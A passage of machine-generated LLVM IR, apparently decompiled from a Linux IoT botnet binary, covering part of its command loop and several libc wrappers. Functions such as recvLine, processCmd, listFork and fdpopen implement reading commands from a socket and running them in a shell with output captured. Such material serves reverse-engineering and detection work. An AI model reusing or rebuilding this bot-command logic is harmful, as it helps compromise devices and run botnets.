  %v2_8051bce118 = load i8, i8* %v5_8051b44, align 1
  %v7_8051bd1125 = icmp eq i8 %v2_8051bce118, 32
  br i1 %v7_8051bd1125, label %dec_label_pc_8051bdf, label %dec_label_pc_8051bd5

dec_label_pc_8051bc8:                             ; preds = %dec_label_pc_8051bd5
  %v5_8051bc8 = add i32 %v4_8051bcb128, 1
  %v22_8051bc8 = inttoptr i32 %v5_8051bc8 to i8*
  %v2_8051bce = load i8, i8* %v22_8051bc8, align 1
  %v7_8051bd1 = icmp eq i8 %v2_8051bce, 32
  br i1 %v7_8051bd1, label %dec_label_pc_8051bdf, label %dec_label_pc_8051bd5

dec_label_pc_8051bd5:                             ; preds = %dec_label_pc_8051bc0, %dec_label_pc_8051bc8
  %v4_8051bcb128 = phi i32 [ %v5_8051bc8, %dec_label_pc_8051bc8 ], [ %v1_8051b41, %dec_label_pc_8051bc0 ]
  %stack_var_-64.0127 = phi i8* [ %v22_8051bc8, %dec_label_pc_8051bc8 ], [ %v5_8051b44, %dec_label_pc_8051bc0 ]
  %v2_8051bd8 = load i8, i8* %stack_var_-64.0127, align 1
  %v4_8051bdb = icmp eq i8 %v2_8051bd8, 0
  %v1_8051bdd = icmp eq i1 %v4_8051bdb, false
  br i1 %v1_8051bdd, label %dec_label_pc_8051bc8, label %dec_label_pc_8051bdf

dec_label_pc_8051bdf:                             ; preds = %dec_label_pc_8051bc8, %dec_label_pc_8051bd5, %dec_label_pc_8051bc0
  %stack_var_-64.0.lcssa = phi i8* [ %v5_8051b44, %dec_label_pc_8051bc0 ], [ %stack_var_-64.0127, %dec_label_pc_8051bd5 ], [ %v22_8051bc8, %dec_label_pc_8051bc8 ]
  %v4_8051bcb.lcssa = phi i32 [ %v1_8051b41, %dec_label_pc_8051bc0 ], [ %v4_8051bcb128, %dec_label_pc_8051bd5 ], [ %v5_8051bc8, %dec_label_pc_8051bc8 ]
  store i8 0, i8* %stack_var_-64.0.lcssa, align 1
  %v5_8051be5 = add i32 %v4_8051bcb.lcssa, 1
  %v2_8051c0e134 = load i8, i8* %v5_8051b44, align 1
  %v4_8051c11136 = icmp eq i8 %v2_8051c0e134, 0
  %v1_8051c13138 = icmp eq i1 %v4_8051c11136, false
  br i1 %v1_8051c13138, label %dec_label_pc_8051bf0, label %dec_label_pc_8051c15

dec_label_pc_8051bf0:                             ; preds = %dec_label_pc_8051bdf, %dec_label_pc_8051bf0
  %v4_8051c0b140 = phi i32 [ %v5_8051c08, %dec_label_pc_8051bf0 ], [ %v1_8051b41, %dec_label_pc_8051bdf ]
  %storemerge16139 = phi i8* [ %v22_8051c08, %dec_label_pc_8051bf0 ], [ %v5_8051b44, %dec_label_pc_8051bdf ]
  %v2_8051bf3 = load i8, i8* %storemerge16139, align 1
  %v3_8051bf3 = zext i8 %v2_8051bf3 to i32
  %v4_8051bf9 = inttoptr i32 %v3_8051bf3 to i8*
  store i8* %v4_8051bf9, i8** %stack_var_-5360, align 4
  %v2_8051bfc = call i32 @__GI_toupper(i32 %v3_8051bf3)
  %v1_8051c01 = urem i32 %v2_8051bfc, 256
  %v2_8051c01 = load i32, i32* @edx, align 4
  %v3_8051c01 = and i32 %v2_8051c01, -256
  %v4_8051c01 = or i32 %v3_8051c01, %v1_8051c01
  store i32 %v4_8051c01, i32* @edx, align 4
  %v1_8051c06 = trunc i32 %v2_8051bfc to i8
  store i8 %v1_8051c06, i8* %storemerge16139, align 1
  %v5_8051c08 = add i32 %v4_8051c0b140, 1
  %v22_8051c08 = inttoptr i32 %v5_8051c08 to i8*
  %v2_8051c0e = load i8, i8* %v22_8051c08, align 1
  %v4_8051c11 = icmp eq i8 %v2_8051c0e, 0
  %v1_8051c13 = icmp eq i1 %v4_8051c11, false
  br i1 %v1_8051c13, label %dec_label_pc_8051bf0, label %dec_label_pc_8051c15

dec_label_pc_8051c15:                             ; preds = %dec_label_pc_8051bf0, %dec_label_pc_8051bdf
  %v22_8051be5 = inttoptr i32 %v5_8051be5 to i8*
  %v2_8051c18 = load i8, i8* %v5_8051b44, align 1
  %v4_8051c1b = icmp eq i8 %v2_8051c18, 0
  %v1_8051c1d = icmp eq i1 %v4_8051c1b, false
  br i1 %v1_8051c1d, label %dec_label_pc_8051cfe, label %dec_label_pc_8051c23

dec_label_pc_8051c23:                             ; preds = %dec_label_pc_8051c15
  %v0_8051c23 = call i32 @listFork()
  %v1_8051c28 = icmp eq i32 %v0_8051c23, 0
  %v1_8051c2a = icmp eq i1 %v1_8051c28, false
  br i1 %v1_8051c2a, label %dec_label_pc_8051e0b, label %dec_label_pc_8051c30

dec_label_pc_8051c30:                             ; preds = %dec_label_pc_8051c23
  store i8* %tmp98, i8** %stack_var_-5360, align 4
  %v7_8051c4c = call i32 @__GI_memset(i8* %tmp98, i32 0, i32 1024)
  store i8* %tmp98, i8** %stack_var_-5360, align 4
  %v6_8051c6a = call i32 @szprintf(i32 %v2_8051c30, i32 ptrtoint ([8 x i8]* @global_var_805d4f1.912 to i32), i32 %v5_8051be5)
  store i8* %tmp98, i8** %stack_var_-5360, align 4
  %v5_8051c81 = call i32 @fdpopen(i32 %v2_8051c30, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_805d4f9.913, i32 0, i32 0))
  %tmp100 = inttoptr i32 %v5_8051c81 to i8*
  store i8* %tmp98, i8** %stack_var_-5360, align 4
  %v6_8051cde141 = call i32 @fdgets(i32 %v2_8051c30, i32 1024, i32 %v5_8051c81)
  %v1_8051ce3142 = icmp eq i32 %v6_8051cde141, 0
  %v1_8051ce5144 = icmp eq i1 %v1_8051ce3142, false
  br i1 %v1_8051ce5144, label %dec_label_pc_8051c8b, label %dec_label_pc_8051ce7

dec_label_pc_8051c8b:                             ; preds = %dec_label_pc_8051c30, %dec_label_pc_8051c8b
  store i8* %tmp98, i8** %stack_var_-5360, align 4
  %v3_8051c94 = call i32 @trim(i8* %tmp98)
  store i8* %tmp98, i8** %stack_var_-5360, align 4
  %v7_8051cb5 = call i32 @__GI_memset(i8* %tmp98, i32 0, i32 1024)
  store i8* inttoptr (i32 1 to i8*), i8** %stack_var_-5360, align 4
  %v2_8051cc1 = call i32 @sleep(i32 1)
  store i8* %tmp98, i8** %stack_var_-5360, align 4
  %v6_8051cde = call i32 @fdgets(i32 %v2_8051c30, i32 1024, i32 %v5_8051c81)
  %v1_8051ce3 = icmp eq i32 %v6_8051cde, 0
  %v1_8051ce5 = icmp eq i1 %v1_8051ce3, false
  br i1 %v1_8051ce5, label %dec_label_pc_8051c8b, label %dec_label_pc_8051ce7

dec_label_pc_8051ce7:                             ; preds = %dec_label_pc_8051c8b, %dec_label_pc_8051c30
  store i8* %tmp100, i8** %stack_var_-5360, align 4
  %v2_8051ced = call i32 @fdpclose(i32 %v5_8051c81)
  store i32 %v2_8051ced, i32* @eax, align 4
  store i8* null, i8** %stack_var_-5360, align 4
  %v2_8051cf9 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_8051cfe

dec_label_pc_8051cfe:                             ; preds = %dec_label_pc_8051c15, %dec_label_pc_8051ce7
  store i32 %v5_8051be5, i32* @eax, align 4
  store i8* %v22_8051be5, i8** %stack_var_-5360, align 4
  %v4_8051d13 = call i32 @__GI_strtok(i32 %v5_8051be5, i32 ptrtoint (i32* @global_var_805d4fb.914 to i32))
  %v5_8051d18 = inttoptr i32 %v4_8051d13 to i8*
  store i8* %v5_8051d18, i8** %stack_var_-36, align 4
  store i8* %v5_8051b44, i8** %stack_var_-132, align 4
  %v5_8051dbf24 = icmp eq i32 %v4_8051d13, 0
  %v1_8051dc331 = icmp eq i1 %v5_8051dbf24, false
  br i1 %v1_8051dc331, label %dec_label_pc_8051d26, label %dec_label_pc_8051dc9

dec_label_pc_8051d26:                             ; preds = %dec_label_pc_8051cfe, %dec_label_pc_8051da8
  %v3_8051d33 = phi i8* [ %tmp101, %dec_label_pc_8051da8 ], [ %v5_8051d18, %dec_label_pc_8051cfe ]
  %stack_var_-40.132 = phi i32 [ %stack_var_-40.0, %dec_label_pc_8051da8 ], [ 1, %dec_label_pc_8051cfe ]
  %v2_8051d29 = load i8, i8* %v3_8051d33, align 1
  %v3_8051d29 = zext i8 %v2_8051d29 to i32
  store i32 %v3_8051d29, i32* @eax, align 4
  %v10_8051d2c = icmp eq i8 %v2_8051d29, 10
  br i1 %v10_8051d2c, label %dec_label_pc_8051da8, label %dec_label_pc_8051d30

dec_label_pc_8051d30:                             ; preds = %dec_label_pc_8051d26
  %v4_8051d26 = ptrtoint i8* %v3_8051d33 to i32
  store i32 %stack_var_-40.132, i32* @ebx, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_8051d26, i32* @edi, align 4
  %v3_8051d4a = call i32 @_strlen(i8* %v3_8051d33)
  %v1_8051d4e = add i32 %v3_8051d4a, 1
  %v4_8051d52 = inttoptr i32 %v1_8051d4e to i8*
  store i8* %v4_8051d52, i8** %stack_var_-5360, align 4
  %v2_8051d55 = call i32 @malloc(i32 %v1_8051d4e)
  %v1_8051d5a = load i32, i32* @ebp, align 4
  %v2_8051d5a = load i32, i32* @ebx, align 4
  %v3_8051d5a = mul i32 %v2_8051d5a, 4
  %v4_8051d5a = add i32 %v1_8051d5a, -124
  %v5_8051d5a = add i32 %v4_8051d5a, %v3_8051d5a
  %v6_8051d5a = inttoptr i32 %v5_8051d5a to i32*
  store i32 %v2_8051d55, i32* %v6_8051d5a, align 4
  %v3_8051d5e = load i8*, i8** %stack_var_-36, align 4
  %v4_8051d5e = ptrtoint i8* %v3_8051d5e to i32
  %v3_8051d75 = call i32 @_strlen(i8* %v3_8051d5e)
  %v1_8051d79 = add i32 %v3_8051d75, 1
  %v0_8051d82 = load i32, i32* @ebp, align 4
  %v2_8051d82 = mul i32 %stack_var_-40.132, 4
  %v3_8051d82 = add i32 %v2_8051d82, -124
  %v4_8051d82 = add i32 %v0_8051d82, %v3_8051d82
  %v5_8051d82 = inttoptr i32 %v4_8051d82 to i32*
  %v6_8051d82 = load i32, i32* %v5_8051d82, align 4
  %v1_8051d86 = inttoptr i32 %v6_8051d82 to i8*
  store i32 %v6_8051d82, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v1_8051d8b = and i32 %v6_8051d82, -256
  %v5_8051d8d = call i8* @_memset(i8* %v1_8051d86, i32 %v1_8051d8b, i32 %v1_8051d79)
  %v6_8051d8d = ptrtoint i8* %v5_8051d8d to i32
  store i32 %v6_8051d8d, i32* @ecx, align 4
  %v0_8051d95 = load i32, i32* @ebp, align 4
  %v4_8051d95 = add i32 %v0_8051d95, %v3_8051d82
  %v5_8051d95 = inttoptr i32 %v4_8051d95 to i32*
  %v6_8051d95 = load i32, i32* %v5_8051d95, align 4
  store i32 %v6_8051d95, i32* @eax, align 4
  %v4_8051d9d = inttoptr i32 %v6_8051d95 to i8*
  store i8* %v4_8051d9d, i8** %stack_var_-5360, align 4
  %v5_8051da0 = call i32 @strcpy(i8* %v4_8051d9d, i32 %v4_8051d5e)
  store i32 %v5_8051da0, i32* @eax, align 4
  %v4_8051da5 = add i32 %stack_var_-40.132, 1
  br label %dec_label_pc_8051da8

dec_label_pc_8051da8:                             ; preds = %dec_label_pc_8051d26, %dec_label_pc_8051d30
  %stack_var_-40.0 = phi i32 [ %stack_var_-40.132, %dec_label_pc_8051d26 ], [ %v4_8051da5, %dec_label_pc_8051d30 ]
  store i8* null, i8** %stack_var_-5360, align 4
  %v4_8051db7 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_805d4fb.914 to i32))
  store i32 %v4_8051db7, i32* %tmp96, align 4
  %v5_8051dbf = icmp eq i32 %v4_8051db7, 0
  %v1_8051dc3 = icmp eq i1 %v5_8051dbf, false
  %tmp101 = inttoptr i32 %v4_8051db7 to i8*
  br i1 %v1_8051dc3, label %dec_label_pc_8051d26, label %dec_label_pc_8051dc9

dec_label_pc_8051dc9:                             ; preds = %dec_label_pc_8051da8, %dec_label_pc_8051cfe
  %stack_var_-40.1.lcssa = phi i32 [ 1, %dec_label_pc_8051cfe ], [ %stack_var_-40.0, %dec_label_pc_8051da8 ]
  %v4_8051dd3 = inttoptr i32 %stack_var_-40.1.lcssa to i8*
  store i8* %v4_8051dd3, i8** %stack_var_-5360, align 4
  %v5_8051dd6 = call i32 @processCmd(i32 %stack_var_-40.1.lcssa, i32* %tmp97)
  %v7_8051ddf = icmp sgt i32 %stack_var_-40.1.lcssa, 1
  br i1 %v7_8051ddf, label %dec_label_pc_8051df1.lr.ph, label %dec_label_pc_8051e0b

dec_label_pc_8051df1.lr.ph:                       ; preds = %dec_label_pc_8051dc9
  br label %dec_label_pc_8051df1

dec_label_pc_8051df1:                             ; preds = %dec_label_pc_8051df1.lr.ph, %dec_label_pc_8051df1
  %storemerge154 = phi i32 [ 1, %dec_label_pc_8051df1.lr.ph ], [ %v4_8051e00, %dec_label_pc_8051df1 ]
  %v0_8051df4 = load i32, i32* @ebp, align 4
  %v2_8051df4 = mul i32 %storemerge154, 4
  %v3_8051df4 = add i32 %v2_8051df4, -124
  %v4_8051df4 = add i32 %v3_8051df4, %v0_8051df4
  %v5_8051df4 = inttoptr i32 %v4_8051df4 to i32*
  %v6_8051df4 = load i32, i32* %v5_8051df4, align 4
  %v4_8051df8 = inttoptr i32 %v6_8051df4 to i8*
  store i8* %v4_8051df8, i8** %stack_var_-5360, align 4
  %v2_8051dfb = call i32 @free(i32 %v6_8051df4)
  %v4_8051e00 = add nuw i32 %storemerge154, 1
  %exitcond = icmp eq i32 %v4_8051e00, %stack_var_-40.1.lcssa
  br i1 %exitcond, label %dec_label_pc_8051e0b, label %dec_label_pc_8051df1

dec_label_pc_8051e0b:                             ; preds = %dec_label_pc_8051df1, %dec_label_pc_8051dc9, %dec_label_pc_8051c23, %dec_label_pc_8051b05, %dec_label_pc_8051ace, %dec_label_pc_8051a86, %dec_label_pc_80517f1
  %v0_8051e11 = load i8*, i8** @global_var_805f4e0.20, align 4
  %v1_8051e11 = ptrtoint i8* %v0_8051e11 to i32
  store i8* %v0_8051e11, i8** %stack_var_-5360, align 4
  %v7_8051e26 = call i32 @recvLine(i32 %v1_8051e11, i8* %tmp95, i32 4096)
  %v13_8051e2e = icmp eq i32 %v7_8051e26, -1
  %v1_8051e32 = icmp eq i1 %v13_8051e2e, false
  br i1 %v1_8051e32, label %dec_label_pc_80519f2, label %dec_label_pc_80517da

; uselistorder directives
  uselistorder i32 %storemerge154, { 1, 0 }
  uselistorder i32 %stack_var_-40.1.lcssa, { 0, 3, 1, 2 }
  uselistorder i32 %v1_8051d4e, { 1, 0 }
  uselistorder i32 %stack_var_-40.132, { 0, 3, 2, 1 }
  uselistorder i8* %v3_8051d33, { 2, 1, 0 }
  uselistorder i32 %v5_8051c81, { 1, 3, 0, 2 }
  uselistorder i8* %v22_8051c08, { 1, 0 }
  uselistorder i32 %v5_8051c08, { 1, 0 }
  uselistorder i32 %v2_8051bfc, { 1, 0 }
  uselistorder i8* %storemerge16139, { 1, 0 }
  uselistorder i8* %v5_8051b44, { 5, 6, 0, 3, 1, 2, 4, 7, 9, 8 }
  uselistorder i32 %v1_8051b41, { 2, 3, 4, 5, 6, 1, 0, 7 }
  uselistorder i8* %storemerge17.lcssa, { 1, 0 }
  uselistorder i32 %v0_8051a02, { 1, 0 }
  uselistorder i32 %storemerge18, { 2, 3, 0, 1 }
  uselistorder i32 %v0_8051999, { 1, 0 }
  uselistorder i32 %storemerge19, { 1, 0, 2 }
  uselistorder i32 %v2_8051966, { 1, 0 }
  uselistorder i32 %v2_8051952, { 1, 0 }
  uselistorder i32 %v0_805191e, { 1, 0 }
  uselistorder i32 %storemerge20, { 1, 2, 0, 3 }
  uselistorder i8* %tmp98, { 5, 2, 1, 4, 3, 0, 6, 7, 8, 9 }
  uselistorder i32 %v2_8051c30, { 1, 0, 2, 3 }
  uselistorder i8* %v5_8051b1d, { 3, 0, 1, 2 }
  uselistorder i8* %tmp95, { 5, 0, 1, 2, 4, 3 }
  uselistorder i32 %v2_8051e0b, { 2, 0, 4, 5, 1, 6, 3 }
  uselistorder i32 %v2_805175f, { 1, 0, 2 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i8** %stack_var_-5360, { 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 0, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 44, 12, 11, 45, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i8** %stack_var_-132, { 1, 0 }
  uselistorder i8** %stack_var_-36, { 2, 1, 0 }
  uselistorder i32 (i32, i32)* @__GI_strtok, { 19, 18, 5, 4, 3, 2, 1, 0, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6 }
  uselistorder i32 (i32, i32, i32)* @fdgets, { 7, 0, 6, 1, 5, 2, 4, 3 }
  uselistorder i32 (i32, i32, i32)* @szprintf, { 209, 4, 3, 2, 1, 0, 208, 207, 206, 205, 204, 203, 202, 201, 200, 199, 198, 197, 196, 195, 194, 193, 192, 191, 190, 189, 188, 187, 186, 185, 184, 183, 182, 181, 180, 179, 178, 177, 176, 175, 174, 173, 172, 171, 170, 169, 168, 167, 166, 165, 164, 163, 162, 161, 160, 159, 158, 157, 156, 155, 154, 153, 152, 151, 150, 149, 148, 147, 146, 145, 144, 143, 142, 141, 140, 139, 138, 137, 136, 135, 134, 133, 132, 131, 130, 129, 128, 127, 126, 125, 124, 123, 122, 121, 120, 119, 118, 117, 116, 115, 114, 113, 112, 111, 110, 109, 108, 107, 106, 105, 104, 103, 102, 101, 100, 99, 98, 97, 96, 95, 94, 93, 92, 91, 90, 89, 88, 87, 86, 85, 84, 83, 82, 81, 80, 79, 78, 77, 76, 75, 74, 73, 72, 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5 }
  uselistorder i32 ()* @listFork, { 18, 5, 4, 3, 2, 1, 0, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6 }
  uselistorder i32 (i32)* @__GI_toupper, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32)* @HackerPrint, { 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 17, 16, 0 }
  uselistorder i8** @global_var_805f4e0.20, { 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @sleep, { 3, 2, 1, 0 }
  uselistorder i32* @global_var_805d45f.907, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @__libc_waitpid, { 2, 1, 0 }
  uselistorder i32 (i32)* @__libc_fork, { 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @init_rand, { 1, 0 }
  uselistorder i32 (i32)* @srand, { 2, 1, 0 }
  uselistorder i32 (i32*)* @__GI_time, { 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 0, 1, 2, 3, 4, 5, 6, 26, 27 }
  uselistorder i32 (i32)* @__GI_inet_ntoa, { 4, 3, 2, 1, 0 }
  uselistorder i32 ()* @getBuild, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8051df1, { 1, 0 }
  uselistorder label %dec_label_pc_8051da8, { 1, 0 }
  uselistorder label %dec_label_pc_8051d26, { 1, 0 }
  uselistorder label %dec_label_pc_8051cfe, { 1, 0 }
  uselistorder label %dec_label_pc_8051c8b, { 1, 0 }
  uselistorder label %dec_label_pc_8051bf0, { 1, 0 }
  uselistorder label %dec_label_pc_8051bdf, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051bd5, { 1, 0 }
  uselistorder label %dec_label_pc_8051b6e, { 1, 0 }
  uselistorder label %dec_label_pc_8051b05, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051afb, { 1, 0 }
  uselistorder label %dec_label_pc_8051ace, { 1, 0 }
  uselistorder label %dec_label_pc_80519ef, { 1, 0 }
  uselistorder label %dec_label_pc_8051985, { 1, 0 }
  uselistorder label %dec_label_pc_8051963, { 1, 0 }
  uselistorder label %dec_label_pc_80518af, { 1, 0 }
  uselistorder label %dec_label_pc_8051885, { 1, 0 }
  uselistorder label %dec_label_pc_80517da, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80517b3, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8051662, { 1, 0 }
}

define i32 @__vfork(i32 %arg1) local_unnamed_addr {
entry:
  %v0_8051e46 = call i32 @vfork()
  %v5_8051e49 = icmp ult i32 %v0_8051e46, -4095
  %v1_8051e4e = icmp eq i1 %v5_8051e49, false
  call void @__pseudo_cond_branch(i1 %v1_8051e4e, i32 134568000)
  ret i32 %v0_8051e46
}

define i32 @__libc_fcntl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %v0_8051e58 = load i32, i32* @edi, align 4
  %v0_8051e59 = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* @ecx, align 4
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg3, i32* @edx, align 4
  %v1_8051e71 = add i32 %arg2, -12
  %v6_8051e77 = icmp ugt i32 %v1_8051e71, 2
  br i1 %v6_8051e77, label %dec_label_pc_8051e87, label %dec_label_pc_8051e79

dec_label_pc_8051e79:                             ; preds = %entry
  %v4_8051e7d = call i32 @__GI_fcntl64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %v1_8051e71)
  br label %dec_label_pc_8051ea9

dec_label_pc_8051e87:                             ; preds = %entry
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_8051e8f = call i32 (i32, i32, ...) @fcntl(i32 %arg1, i32 %arg2)
  store i32 %v2_8051e8f, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v2_8051e8f, -4095
  br i1 %tmp, label %dec_label_pc_8051ea7, label %dec_label_pc_8051e9b

dec_label_pc_8051e9b:                             ; preds = %dec_label_pc_8051e87
  %v1_8051e9b = call i32 @__errno_location(i32 %v0_8051e59)
  %v0_8051ea0 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051ea0 = sub i32 0, %v0_8051ea0
  %v2_8051ea2 = inttoptr i32 %v1_8051e9b to i32*
  store i32 %v1_8051ea0, i32* %v2_8051ea2, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051ea7

dec_label_pc_8051ea7:                             ; preds = %dec_label_pc_8051e87, %dec_label_pc_8051e9b
  %v0_8051ea7 = phi i32 [ %v2_8051e8f, %dec_label_pc_8051e87 ], [ -1, %dec_label_pc_8051e9b ]
  br label %dec_label_pc_8051ea9

dec_label_pc_8051ea9:                             ; preds = %dec_label_pc_8051e79, %dec_label_pc_8051ea7
  %v0_8051eae = phi i32 [ %v4_8051e7d, %dec_label_pc_8051e79 ], [ %v0_8051ea7, %dec_label_pc_8051ea7 ]
  store i32 %v0_8051e59, i32* @ebx, align 4
  store i32 %v0_8051e58, i32* @edi, align 4
  ret i32 %v0_8051eae

; uselistorder directives
  uselistorder i32 %v2_8051e8f, { 1, 0, 2 }
  uselistorder i32 %v0_8051e59, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2, 3 }
  uselistorder i32 %arg1, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_8051ea9, { 1, 0 }
  uselistorder label %dec_label_pc_8051ea7, { 1, 0 }
}

define i32 @__GI_fcntl64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051eb0 = load i32, i32* @edi, align 4
  store i32 %v0_8051eb0, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  store i32 %arg2, i32* @ecx, align 4
  store i32 %arg3, i32* @edx, align 4
  %v0_8051ec8 = load i32, i32* @ebx, align 4
  %v1_8051ed0 = call i32 @int80_syscall(i32 221)
  store i32 %v1_8051ed0, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8051ed0, -4095
  br i1 %tmp, label %dec_label_pc_8051ee8, label %dec_label_pc_8051edc

dec_label_pc_8051edc:                             ; preds = %entry
  %v1_8051edc = call i32 @__errno_location(i32 %v0_8051ec8)
  %v0_8051ee1 = load i32, i32* %edi.global-to-local, align 4
  %v1_8051ee1 = sub i32 0, %v0_8051ee1
  %v2_8051ee3 = inttoptr i32 %v1_8051edc to i32*
  store i32 %v1_8051ee1, i32* %v2_8051ee3, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8051ee8

dec_label_pc_8051ee8:                             ; preds = %entry, %dec_label_pc_8051edc
  %v0_8051eeb = phi i32 [ %v1_8051ed0, %entry ], [ -1, %dec_label_pc_8051edc ]
  %v2_8051eed = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8051eed, i32* %edi.global-to-local, align 4
  ret i32 %v0_8051eeb

; uselistorder directives
  uselistorder i32 %v1_8051ed0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051ee8, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @__GI__exit(i32 %arg1) local_unnamed_addr #0 {
entry:
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg1, i32* @ebx, align 4
  call void @exit(i32 %arg1)
  unreachable
}

define i32 @access(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_8051f18 = load i32, i32* @ebx, align 4
  store i32 %v0_8051f18, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v2_8051f2b = call i32 @access(i32 %v0_8051f18, i32 %tmp4)
  store i32 %v2_8051f2b, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v2_8051f2b, -4095
  br i1 %tmp, label %dec_label_pc_8051f44, label %dec_label_pc_8051f38

dec_label_pc_8051f38:                             ; preds = %entry
  %v0_8051f38 = load i32, i32* %stack_var_-4, align 4
  %v1_8051f38 = call i32 @__errno_location(i32 %v0_8051f38)
  %v0_8051f3d = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051f3d = sub i32 0, %v0_8051f3d
  %v2_8051f3f = inttoptr i32 %v1_8051f38 to i32*
  store i32 %v1_8051f3d, i32* %v2_8051f3f, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051f44

dec_label_pc_8051f44:                             ; preds = %entry, %dec_label_pc_8051f38
  %v0_8051f45 = phi i32 [ %v2_8051f2b, %entry ], [ -1, %dec_label_pc_8051f38 ]
  %v2_8051f48 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8051f48, i32* @ebx, align 4
  ret i32 %v0_8051f45

; uselistorder directives
  uselistorder i32 %v2_8051f2b, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 (i32, i32)* @access, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8051f44, { 1, 0 }
}

define i32 @chdir(i32 %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051f4c = load i32, i32* @edi, align 4
  store i32 %v0_8051f4c, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @edi, align 4
  %v0_8051f54 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_8051f5c = call i32 @chdir(i32 %v0_8051f54)
  store i32 %v0_8051f54, i32* @ebx, align 4
  store i32 %v1_8051f5c, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8051f5c, -4095
  br i1 %tmp, label %dec_label_pc_8051f74, label %dec_label_pc_8051f68

dec_label_pc_8051f68:                             ; preds = %entry
  %v1_8051f68 = call i32 @__errno_location(i32 %v0_8051f54)
  %v0_8051f6d = load i32, i32* %edi.global-to-local, align 4
  %v1_8051f6d = sub i32 0, %v0_8051f6d
  %v2_8051f6f = inttoptr i32 %v1_8051f68 to i32*
  store i32 %v1_8051f6d, i32* %v2_8051f6f, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8051f74

dec_label_pc_8051f74:                             ; preds = %entry, %dec_label_pc_8051f68
  %v0_8051f75 = phi i32 [ %v1_8051f5c, %entry ], [ -1, %dec_label_pc_8051f68 ]
  %v2_8051f74 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8051f74, i32* @edx, align 4
  %v2_8051f78 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8051f78, i32* @edi, align 4
  ret i32 %v0_8051f75

; uselistorder directives
  uselistorder i32 %v1_8051f5c, { 1, 0, 2 }
  uselistorder i32 %v0_8051f54, { 1, 0, 2 }
  uselistorder i32 (i32)* @chdir, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8051f74, { 1, 0 }
}

define i32 @__libc_close(i32 %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051f7c = load i32, i32* @edi, align 4
  store i32 %v0_8051f7c, i32* %stack_var_-4, align 4
